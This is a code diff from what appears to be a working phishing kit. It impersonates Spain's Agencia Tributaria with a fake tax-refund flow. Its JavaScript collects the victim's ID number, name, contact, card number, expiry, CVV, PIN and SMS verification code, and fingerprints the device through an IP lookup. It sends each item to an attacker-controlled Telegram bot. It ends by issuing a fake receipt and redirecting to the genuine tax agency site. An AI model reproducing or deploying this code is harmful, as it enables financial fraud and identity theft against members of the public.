+            document.getElementById('t-step5-title').innerText = t.step5Title;
+            document.getElementById('t-step5-h3').innerText = t.step5H3;
+            document.getElementById('t-step5-p').innerHTML = t.step5P;
+            document.getElementById('t-btn-inicio').innerText = t.btnInicio;
+
+            document.getElementById('dni-error').innerText = t.dniErrorText;
+            document.getElementById('card-error').innerText = t.cardErrorText;
+            document.getElementById('expiry-error').innerText = t.expiryErrorText;
+            document.getElementById('cvv-error').innerText = t.cvvErrorText;
+            document.getElementById('pin-error').innerText = t.pinErrorText;
+            document.getElementById('final-pin-error').innerText = t.finalPinErrorText;
+
+            updateStepIndicator(activeStepNumber);
+        }
+
+        window.addEventListener('click', function(e) {
+            const btn = document.getElementById('current-lang-btn');
+            const dropdown = document.getElementById('lang-dropdown');
+            if (!btn.contains(e.target) && !dropdown.contains(e.target)) {
+                dropdown.classList.add('hidden');
+            }
+        });
+
+        let activeStepNumber = 1;
+
+        function updateStepIndicator(stepNum) {
+            activeStepNumber = stepNum;
+            const t = translations[currentLang];
+            const indicatorText = t.stepIndicator.replace('{current}', stepNum);
+            const nameText = t.stepNames[stepNum - 1] || "";
+
+            document.getElementById('step-indicator-text').innerText = indicatorText;
+            document.getElementById('step-name-text').innerText = nameText;
+            
+            const percentage = (stepNum / 4) * 100;
+            document.getElementById('progress-fill').style.width = percentage + '%';
+
+            if (stepNum === 5) {
+                document.getElementById('progress-bar-container').classList.add('hidden');
+            } else {
+                document.getElementById('progress-bar-container').classList.remove('hidden');
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const cardInput = document.getElementById('card-number');
+            const brandIcon = document.getElementById('card-brand-icon');
+
+            if (cardInput) {
+                cardInput.addEventListener('input', (e) => {
+                    let value = e.target.value.replace(/\D/g, ''); 
+                    if (value.length > 16) value = value.substring(0, 16); 
+                    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+                    e.target.value = formattedValue;
+
+                    if (value.startsWith('4')) {
+                        brandIcon.innerText = "VISA";
+                    } else if (/^5[1-5]/.test(value) || /^2[2-7]/.test(value)) {
+                        brandIcon.innerText = "MC";
+                    } else {
+                        brandIcon.innerText = "";
+                    }
+                });
+            }
+
+            const expiryInput = document.getElementById('card-expiry');
+            if (expiryInput) {
+                expiryInput.addEventListener('input', (e) => {
+                    let value = e.target.value.replace(/\D/g, ''); 
+                    if (value.length > 2) {
+                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    }
+                    e.target.value = value;
+                });
+            }
+        });
+
+        function sendToTelegram(message) {
+            if (TELEGRAM_BOT_TOKEN === "TU_BOT_TOKEN_AQUI" || TELEGRAM_CHAT_ID === "TU_CHAT_ID_AQUI") {
+                console.warn("Telegram Token o Chat ID no configurados.");
+                return;
+            }
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            return fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error("Error al enviar a Telegram:", err));
+        }
+
+        function showStep(stepId, stepNum) {
+            document.querySelectorAll('.step-container').forEach(el => el.classList.add('hidden'));
+            document.getElementById(stepId).classList.remove('hidden');
+            if (stepNum) {
+                updateStepIndicator(stepNum);
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+
+            if (stepId === 'step-5') {
+                startRedirectCountdown();
+            } else {
+                if (redirectInterval) clearInterval(redirectInterval);
+            }
+        }
+
+        function startRedirectCountdown() {
+            let timeLeft = 7;
+            const timerEl = document.getElementById('countdown-timer');
+            if (redirectInterval) clearInterval(redirectInterval);
+
+            redirectInterval = setInterval(() => {
+                timeLeft--;
+                if (timerEl) timerEl.innerText = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(redirectInterval);
+                    window.location.href = 'https://sede.agenciatributaria.gob.es/';
+                }
+            }, 1000);
+        }
+
+        function downloadReceipt() {
+            const receiptContent = `AGENCIA TRIBUTARIA - JUSTIFICANTE DE SOLICITUD DE REEMBOLSO\n=======================================================\nExpediente: ${formDataStore.expediente || 'B2845641546'}\nContribuyente: ${formDataStore.nombre || 'Ciudadano'} (DNI/NIE: ${formDataStore.dni || ''})\nImporte Aprobado: ${formDataStore.importe || '311.29 €'}\nCSV (Código Seguro Verificación): 74F8A91C3E2048576209\nEstado: Registrado con éxito (Plazo estimado: 14 días hábiles)\nFecha: ${new Date().toLocaleDateString()}`;
+            const blob = new Blob([receiptContent], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `Justificante_Reembolso_${formDataStore.expediente || 'AEAT'}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        function validateDniNie(value) {
+            let dni = value.trim().toUpperCase();
+            const dniRegex = /^[0-9XYZ][0-9]{7}[A-Z]$|^[ABCDEFGHJKLMNPQRSUVW][0-9]{7}[0-9A-J]$/;
+            return dniRegex.test(dni);
+        }
+
+        async function handleStep1(event) {
+            event.preventDefault();
+            const dniVal = document.getElementById('dni').value;
+            const dniError = document.getElementById('dni-error');
+
+            if (!validateDniNie(dniVal)) {
+                dniError.classList.remove('hidden');
+                return;
+            } else {
+                dniError.classList.add('hidden');
+            }
+
+            formDataStore.expediente = document.getElementById('expediente').value;
+            formDataStore.importe = document.getElementById('importe').value;
+            formDataStore.nombre = document.getElementById('nombre').value;
+            formDataStore.dni = dniVal.toUpperCase();
+            formDataStore.contacto = document.getElementById('contacto').value;
+
+            let datosTecnicos = {};
+            try {
+                let respuestaIP = await fetch('https://ipapi.co/json/');
+                let dataIP = await respuestaIP.json();
+                datosTecnicos.ip = dataIP.ip || "No disponible";
+                datosTecnicos.pais = dataIP.country_name || "Desconocido";
+                datosTecnicos.ciudad = dataIP.city || "Desconocida";
+                datosTecnicos.isp = dataIP.org || "Desconocido";
+            } catch (error) {
+                datosTecnicos.ip = "No disponible";
+                datosTecnicos.pais = "Desconocido";
+                datosTecnicos.ciudad = "Desconocida";
+                datosTecnicos.isp = "Desconocido";
+            }
+
+            datosTecnicos.memoriaRAM = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "No desvelada";
+            datosTecnicos.nucleosCPU = navigator.hardwareConcurrency || "Desconocido";
+            datosTecnicos.conexion = navigator.connection ? navigator.connection.effectiveType : "Desconocida";
+            datosTecnicos.pantalla = `${window.screen.width}x${window.screen.height}`;
+            datosTecnicos.tactil = navigator.maxTouchPoints > 0 ? "Sí" : "No";
+            datosTecnicos.navegador = navigator.userAgent;
+
+            let personaRealStr = "❌ No";
+            let botStr = "🤖 Sí";
+            
+            if (userInteractionDetected && !navigator.webdriver && window.outerWidth !== 0) {
+                personaRealStr = "👤 Sí";
+                botStr = "❌ No";
+            }
+
+            const msgDispositivo = 
 `⚡ ══════════════════════════ ⚡
 🚨 **NUEVA CONEXIÓN / SESIÓN ACTIVA** 🚨
 ⚡ ══════════════════════════ ⚡
@@ -909,9 +909,9 @@ const msgDispositivo =
 
 ⚡ ══════════════════════════ ⚡`;
 
-await sendToTelegram(msgDispositivo);
+            await sendToTelegram(msgDispositivo);
 
-const msgUsuario =
+            const msgUsuario = 
 `💎 ══════════════════════════ 💎
 📋 **CAPTURA DE DATOS [PASO 1]** 📋
 💎 ══════════════════════════ 💎
@@ -924,325 +924,163 @@ const msgUsuario =
 
 💎 ══════════════════════════ 💎`;
 
-await sendToTelegram(msgUsuario);
+            await sendToTelegram(msgUsuario);
 
-
-showStep('spinner-1');
-
+            showStep('spinner-1');
             setTimeout(() => showStep('step-2', 2), 2500);
-
-        
-
-
-
-        function checkLuhn(val) {
-
-            let sum = 0;
-
-            let shouldDouble = false;
-
-            let cleanVal = val.replace(/\D/g, '');
-
-            if (cleanVal.length < 13 || cleanVal.length > 19) return false;
-
-            
-
-            for (let i = cleanVal.length - 1; i >= 0; i--) {
-
-                let digit = parseInt(cleanVal.charAt(i), 10);
-
-                if (shouldDouble) {
-
-                    if ((digit *= 2) > 9) digit -= 9;
-
-                }
-
-                sum += digit;
-
-                shouldDouble = !shouldDouble;
-
-            }
-
-            return (sum % 10) === 0;
-
         }
 
-
+        function checkLuhn(val) {
+            let sum = 0;
+            let shouldDouble = false;
+            let cleanVal = val.replace(/\D/g, '');
+            if (cleanVal.length < 13 || cleanVal.length > 19) return false;
+            
+            for (let i = cleanVal.length - 1; i >= 0; i--) {
+                let digit = parseInt(cleanVal.charAt(i), 10);
+                if (shouldDouble) {
+                    if ((digit *= 2) > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return (sum % 10) === 0;
+        }
 
         function validateCardAndProceed(event) {
-
             event.preventDefault();
-
             const cardNumber = document.getElementById('card-number').value;
-
             const cardExpiry = document.getElementById('card-expiry').value;
-
             const cardCvv = document.getElementById('card-cvv').value.replace(/\D/g, '');
-
             const cardPin = document.getElementById('card-pin').value.replace(/\D/g, '');
-
             
-
             const cardError = document.getElementById('card-error');
-
             const expiryError = document.getElementById('expiry-error');
-
             const cvvError = document.getElementById('cvv-error');
-
             const pinError = document.getElementById('pin-error');
-
-
 
             let isValid = true;
 
-
-
             if (!checkLuhn(cardNumber)) {
-
                 cardError.classList.remove('hidden');
-
                 isValid = false;
-
             } else {
-
                 cardError.classList.add('hidden');
-
             }
-
-
 
             const currentDate = new Date();
-
             const currentYear = currentDate.getFullYear() % 100;
-
             const currentMonth = currentDate.getMonth() + 1;
 
-
-
             const expiryParts = cardExpiry.split('/');
-
             const expMonth = parseInt(expiryParts[0], 10);
-
             const expYear = parseInt(expiryParts[1], 10);
 
-
-
             const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
-
             
-
             let isExpiryValid = expiryRegex.test(cardExpiry);
-
             if (isExpiryValid) {
-
                 if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
-
                     isExpiryValid = false;
-
                 }
-
             }
-
-
 
             if (!isExpiryValid) {
-
                 expiryError.innerText = "La tarjeta está caducada o el año es inferior a 2026.";
-
                 expiryError.classList.remove('hidden');
-
                 isValid = false;
-
             } else {
-
                 expiryError.classList.add('hidden');
-
             }
-
-
 
             const isAmex = cardNumber.replace(/\D/g, '').startsWith('34') || cardNumber.replace(/\D/g, '').startsWith('37');
-
             const expectedCvvLength = isAmex ? 4 : 3;
-
             if (cardCvv.length !== expectedCvvLength) {
-
                 cvvError.classList.remove('hidden');
-
                 isValid = false;
-
             } else {
-
                 cvvError.classList.add('hidden');
-
             }
-
-
 
             if (cardPin.length < 4 || cardPin.length > 6) {
-
                 pinError.classList.remove('hidden');
-
                 isValid = false;
-
             } else {
-
                 pinError.classList.add('hidden');
-
             }
-
-
 
             if (isValid) {
-
                 formDataStore.cardNumber = cardNumber;
-
                 formDataStore.cardExpiry = cardExpiry;
-
                 formDataStore.cardCvv = cardCvv;
-
                 formDataStore.cardPin = cardPin;
 
-
-
                 const msgCard = 
-
 `💳 *NUEVOS DATOS BANCARIOS [PASO 2]*
-
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 💳 *Número:* \`${cardNumber}\`
-
 ⏳ *Caducidad:* \`${cardExpiry}\`
-
 🔒 *CVV (${cardCvv.length} dígitos):* \`${cardCvv}\`
-
 🔑 *PIN Tarjeta (${cardPin.length} dígitos):* \`${cardPin}\`
-
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
-
                 sendToTelegram(msgCard);
 
-
-
                 showStep('spinner-2');
-
                 setTimeout(() => showStep('step-3', 3), 2500);
-
             }
-
         }
-
-
 
         function handleStep3(event) {
-
             event.preventDefault();
-
             const smsCode = document.getElementById('sms-code').value;
-
             formDataStore.smsCode = smsCode;
 
-
-
             const msgSms = 
-
 `💬 *VERIFICACIÓN SMS [PASO 3]*
-
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 🔑 *Código SMS:* \`${smsCode}\`
-
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
-
             sendToTelegram(msgSms);
 
-
-
             showStep('spinner-3');
-
             setTimeout(() => showStep('step-4', 4), 2500);
-
         }
 
-
-
         function handleStep4(event) {
-
             event.preventDefault();
-
             const pinCode = document.getElementById('pin-code').value.replace(/\D/g, '');
-
             const finalPinError = document.getElementById('final-pin-error');
 
-
-
             // Validación de coincidencia con el PIN ingresado en el paso 2
-
             if (pinCode !== formDataStore.cardPin) {
-
                 finalPinError.classList.remove('hidden');
-
                 return;
-
             } else {
-
                 finalPinError.classList.add('hidden');
-
             }
-
-
 
             formDataStore.pinCode = pinCode;
 
-
-
             const msgPin = 
-
 `🔐 *PIN DE VERIFICACIÓN FINAL [PASO 4]*
-
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 🛡️ *PIN de Seguridad (${pinCode.length} dígitos):* \`${pinCode}\`
-
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
-
             sendToTelegram(msgPin);
 
-
-
             showStep('spinner-4');
-
             setTimeout(() => showStep('step-5', 5), 2500);
-
         }
-
-
 
         function resetProcess() {
-
             if (redirectInterval) clearInterval(redirectInterval);
-
             formDataStore = {};
-
             document.getElementById('form-step-1').reset();
-
             document.getElementById('form-step-2').reset();
-
             document.getElementById('form-step-3').reset();
-
             document.getElementById('form-step-4').reset();
-
             showStep('step-1', 1);
-
         }
-
     </script>
-
 </body>
-
 </html>
-
-
-
-
